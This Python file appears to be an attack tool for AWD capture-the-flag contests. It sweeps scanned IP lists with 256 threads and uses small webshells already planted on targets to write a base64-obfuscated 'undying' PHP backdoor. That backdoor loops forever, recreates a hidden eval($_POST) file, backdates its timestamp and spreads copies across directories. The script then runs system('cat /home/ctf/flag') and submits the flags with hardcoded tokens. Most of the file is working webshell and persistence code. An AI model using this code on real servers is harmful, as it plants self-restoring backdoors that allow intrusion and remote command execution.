# -*- coding: utf-8 -*-
# 作者    : 轩昂妄想
# 文件    : Link_the_Trojan.py
# 时间    : 2022/10/6 15:39
# -----------------------------------------------------------------------------------
import requests
import re
import time
import threading
import sys

sys.path.append("../Information_collection/")
import Information_collection.AWD_ipscan as awd


def log(Record_information):
    file = open('log.txt', "a")
    file.write(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()) + '  {}\n'.format(Record_information))
    file.close()


def resume(i):
    global url2
    try:
        url2 = i + path2
        print("正在链接:" + url2)
        response = requests.post(url2, headers=headers, timeout=0.1)  # 写入不死马
        code = response.status_code
        if code != 200:
            print("失去链接:" + url2)
            message = "失去链接:" + url2
            log(message)
    except requests.exceptions.RequestException as e:
        res = re.findall("Read timed out", str(e))
        if res == ['Read timed out']:
            pass
        else:
            print("失去链接:" + url2)
            message = "失去链接:" + url2
            log(message)


def shell_post(i):  # post请求
    try:
        url1 = i + path1
        try:
            print("正在链接:" + url1)
            response1 = requests.post(url1, data=data, headers=headers, timeout=1)  # 链接木马并上传命令
        except requests.exceptions.RequestException as e:
            print("失去链接:" + url1)
            message = "失去链接:" + url1
            log(message)
        # response1 = requests.post(url1, data=xieru, headers=headers, timeout=1)  # 链接木马并上传命令(此项是用来上传其他文件下的不死马)
        try:
            resume(i)
        except requests.exceptions.RequestException as e:
            pass
        url = i + path
        print("正在链接:" + url)
        response = requests.post(url, data=payload, headers=headers, timeout=3)  # 写入不死马
        code = response.status_code
        if code != 200:
            print("失去链接:" + url)
            message = "失去链接:" + url
            log(message)
        flag_submit(response, i)

    except requests.exceptions.RequestException as e:
        print("失去链接:" + url)
        message = "失去链接:" + url1
        log(message)
        message = "-------------------------------------------------------------------------------------------"
        log(message)
        print("-------------------------------------------------------------------------------------------")


def shell_get(i):  # get请求
    for i in ip_list:
        try:
            url = i + path_get
            print(url)
            response = requests.get(url, headers=headers, timeout=1)
            code = response.status_code
            if code == 200:
                flag_submit(response, i)
            else:
                print("失去链接:" + url)
                message = "失去链接:" + url
                log(message)
                message = "-------------------------------------------------------------------------------------------"
                log(message)
                print("-------------------------------------------------------------------------------------------")
        except requests.exceptions.RequestException as e:
            print("失去链接:" + url)
            message = "失去链接:" + url
            log(message)
            message = "-------------------------------------------------------------------------------------------"
            log(message)
            print("-------------------------------------------------------------------------------------------")


def flag_submit(response, i):
    try:
        flags = (re.search("flag{.*}", response.text).group(0)[:38])
        print(flags)
        urlflag = "https://ctf.bugku.com/pvp/submit.html?token=0785ad1749d50b8ae8b7a3450eac8b37&flag=" + flags
        print(urlflag)
        try:
            results = requests.get(
                "https://ctf.bugku.com/awd/submit.html?token=0785ad1749d50b8ae8b7a3450eac8b37&flag=" + flags,
                headers=headers)
            results1 = requests.get(
                "https://ctf.bugku.com/awd/submit.html?token=fcdd437d9dfb89bc31604ddb2ecb6011&flag=" + flags,
                headers=headers)
            # print(results.text)
            results = results.text
            result = re.findall("Flag\w\w", results)
            if result == ['Flag正确']:
                print(results)
                print("-------------------------------------------------------------------------------------------")
            else:
                print("flag提交失败!!!")
                message = i + "\n                     flag提交失败!!!\n                     " + urlflag
                log(message)
                print("-------------------------------------------------------------------------------------------")
                message = "-------------------------------------------------------------------------------------------"
                log(message)

        except requests.exceptions.RequestException as e:
            print("flag提交失败!!!")
            print("-------------------------------------------------------------------------------------------")
            message = i + "\n                     flag提交失败!!!\n                     " + urlflag
            log(message)
            message = "-------------------------------------------------------------------------------------------"
            log(message)
    except requests.exceptions.RequestException as e:
        print("没有flag!!!")
        print("-------------------------------------------------------------------------------------------")


def The_target(url):
    file = open('ip_Survival_goal.txt', "w")
    print(url)
    file.write('{}\n'.format(url))
    file.close()


def Threads(amount, total, switch):
    for i in range(amount):
        y = (total / amount)
        x = i * (total / amount)
        thread = threading.Thread(name='i', target=attack, args=(int(x), int(x + y), switch))
        thread.start()  # 启动线程


def ip_list(switch):
    if int(switch) == 0:
        file = open('../Information_collection/iplist.txt', "r")
    else:
        file = open('../Information_collection/ip_result_of_scanning.txt', "r")
    ip_list = file.read().splitlines()
    file.close()
    return ip_list


def attack(x, y, switch):
    iplist = ip_list(switch)
    while True:
        for ip in range(x, y):
            shell_post(iplist[ip])
            # shell_get(iplist[ip])
            # time.sleep(5)


def main():
    amount = 256
    total = 256
    while True:
        switch2 = input("攻击的名单：0.未扫描ip   1.扫描后的ip:")
        print("------------------------------------------------------------")
        # print("0.全部攻击256.256\n1.扫描结果攻击1,50")
        # switch1 = input("输入执行的序号:")
        # print("------------------------------------------------------------")
        # if int(switch1) == 0:
        # amount = 256
        # total = 256
        # else:
        #     amount = 1
        #     total = 50
        print("0.默认:线程数{};目标总数{}".format(amount, total))
        print("8.是否扫描ip并且攻击")
        print("1.调整线程数")
        print("2.调整目标总数")
        print("3.是否扫描ip")
        switch = input("输入执行的序号:")
        if int(switch) == 0:
            break
        elif int(switch) == 1:
            a = input("请输入需要修改的线程数:")
            amount = int(a)
        elif int(switch) == 2:
            b = input("请输入需要修改的目标总数:")
            total = int(b)
        elif int(switch) == 3:
            awd.Threads(256, 256)
            time.sleep(1)
        elif int(switch) == 8:
            awd.Threads(256, 256)
            Threads(amount, total, int(switch2))
    print("------------------------------------------------------------")
    Threads(amount, total, int(switch2))


# busi = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicHdkIl0pPT0iY2YzNmE4M2JlN2M0MDM3NmFkYWQ5ZDBhYmIzNmFjYzAiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4nOwp3aGlsZSAoMSl7CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDIxLTEyLTAxIDA5OjEwOjEyIiAuY29uZjFnLnBocCcpOwogICAgc3lzdGVtKCJlY2hvICdkSEpoZG1WeVpHbHlLQ2tvY0hWemFHUWdJaVF4SWlBK0lDOWtaWFl2Ym5Wc2JDQXlQaVl4TzJadmNpQm1hV3hsSUdsdUlHQnNjeUF0TVdBN1pHOGdhV1lnZEdWemRDQXRaQ0FpSkdacGJHVWlPM1JvWlc0Z1kzQWdKRkJYUkM4dVkyOXVaakZuTG5Cb2NDQWtVRmRFTHlSbWFXeGxPMlZqYUc4Z0lpUlFWMFF2SkdacGJHVWlPM1J5WVhabGNtUnBjaUFpSkdacGJHVWlJQ0lrS0NoMFlXSWdLeUF4SUNBcEtTSTdabWs3Wkc5dVpTazdkSEpoZG1WeVpHbHknIHwgYmFzZTY0IC1kID4gMS5zaCIpOwogICAgJGFzZCA9IHN5c3RlbSgiYmFzaCAxLnNoIik7CiAgICB1c2xlZXAoMTAwMCk7Cn0=' | base64 -d > conf1g.php");'''
busima = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicHdkIl0pPT0iODAwYzE3MzA5NmIzNzhhNGYzYzcyNGYyOWRiMzQwNjkiKXtAZXZhbCgkX1BPU1RbImJ1c2kiXSk7fSA/Pic7CndoaWxlICgxKXsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKICAgIHN5c3RlbSgndG91Y2ggLW0gLWQgIjIwMjEtMTItMDEgMDk6MTA6MTIiIC5jb25mMWcucGhwJyk7CiAgICBzeXN0ZW0oImVjaG8gJ2RISmhkbVZ5WkdseUtDa29jSFZ6YUdRZ0lpUXhJaUErSUM5a1pYWXZiblZzYkNBeVBpWXhPMlp2Y2lCbWFXeGxJR2x1SUdCc2N5QXRNV0E3Wkc4Z2FXWWdkR1Z6ZENBdFpDQWlKR1pwYkdVaU8zUm9aVzRnWTNBZ0pGQlhSQzh1WTI5dVpqRm5MbkJvY0NBa1VGZEVMeVJtYVd4bE8yVmphRzhnSWlSUVYwUXZKR1pwYkdVaU8zUnlZWFpsY21ScGNpQWlKR1pwYkdVaUlDSWtLQ2gwWVdJZ0t5QXhJQ0FwS1NJN1ptazdaRzl1WlNrN2RISmhkbVZ5WkdseScgfCBiYXNlNjQgLWQgPiAyLnNoIik7CiAgICAkYXNkID0gc3lzdGVtKCJiYXNoIDIuc2giKTsKICAgIHVzbGVlcCg1MDApOwp9Cgo=' | base64 -d > conf1g.php");'''
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
}

# path1 = "/123.php"  # 小木马位置
# path = "/.conf1g.php?pwd=busi"  # 不死马位置
# path2 = "/conf1g.php"  # 激活不死马

path1 = "/upload/0/file/202210/123.php"  # 小木马位置
path = "/upload/0/file/202210/.conf1g.php?pwd=busi"  # 不死马位置
path2 = "/upload/0/file/202210/conf1g.php"  # 激活不死马

# path_get = "/upload/0/file/202210/111.php?aaa=print_r(readfile(\'flag\'));" # 命令执行等
path_get = "/upload/0/file/202210/111.php?aaa=system(\"cat /home/ctf/flag\");"  # 命令执行等

passwd1 = "aaa"  # 小木马密码
passwd = "busi"  # 不死马密码

data = {
    passwd1: busima  # 输入命令，按照需要修改(写入不死马)
}

payload = {
    # passwd: 'print_r(readfile(\'/home/ctf/123\'));'  # 输入命令，按照需要修改(不死马)
    passwd: "system('cat /home/ctf/flag');"
}

# 写入不死马
file = open("E://tool/AWD/Network-security-tools/Attack/busi.php", "r", encoding="utf-8").read()  # 本地的不死马文件名
xieru = {
    passwd: "file_put_contents(\"busi.php\",\"" + file + "\");"  # 写入不死马
}

if __name__ == "__main__":
    main()
